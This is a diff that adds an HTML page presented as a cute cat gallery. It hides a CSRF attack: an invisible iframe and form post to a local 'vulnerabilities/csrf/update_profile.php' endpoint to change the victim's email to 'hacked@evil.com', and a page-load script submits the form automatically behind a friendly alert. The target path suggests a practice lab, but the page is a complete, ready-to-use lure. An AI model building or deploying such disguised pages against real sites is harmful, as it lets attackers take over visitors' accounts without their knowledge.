@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cute Cats Gallery</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        h1 {
+            color: #ff69b4;
+            text-align: center;
+        }
+        .gallery {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .cat-image {
+            margin: 10px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .cat-image img {
+            width: 300px;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+        .hidden-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Adorable Cat Gallery</h1>
+    <p style="text-align: center;">Enjoy these cute cat pictures!</p>
+    
+    <!-- Hidden CSRF Attack Form -->
+    <iframe name="hiddenFrame" style="display:none"></iframe>
+    <form id="csrfForm" action="http://localhost/vulnerabilities/csrf/update_profile.php" method="POST" target="hiddenFrame" class="hidden-form">
+        <input type="hidden" name="email" value="hacked@evil.com">
+    </form>
+    
+    <div class="gallery">
+        <div class="cat-image">
+            <img src="https://placekitten.com/300/200" alt="Cute cat">
+        </div>
+        <div class="cat-image">
+            <img src="https://placekitten.com/301/200" alt="Cute cat">
+        </div>
+        <div class="cat-image">
+            <img src="https://placekitten.com/302/200" alt="Cute cat">
+        </div>
+        <div class="cat-image">
+            <img src="https://placekitten.com/303/200" alt="Cute cat">
+        </div>
+        <div class="cat-image">
+            <img src="https://placekitten.com/304/200" alt="Cute cat">
+        </div>
+        <div class="cat-image">
+            <img src="https://placekitten.com/305/200" alt="Cute cat">
+        </div>
+    </div>
+    
+    <script>
+        // Automatically submit the form when the page loads
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('csrfForm').submit();
+                alert('Thanks for visiting our cat gallery! Hope you enjoyed the cute cats!');
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
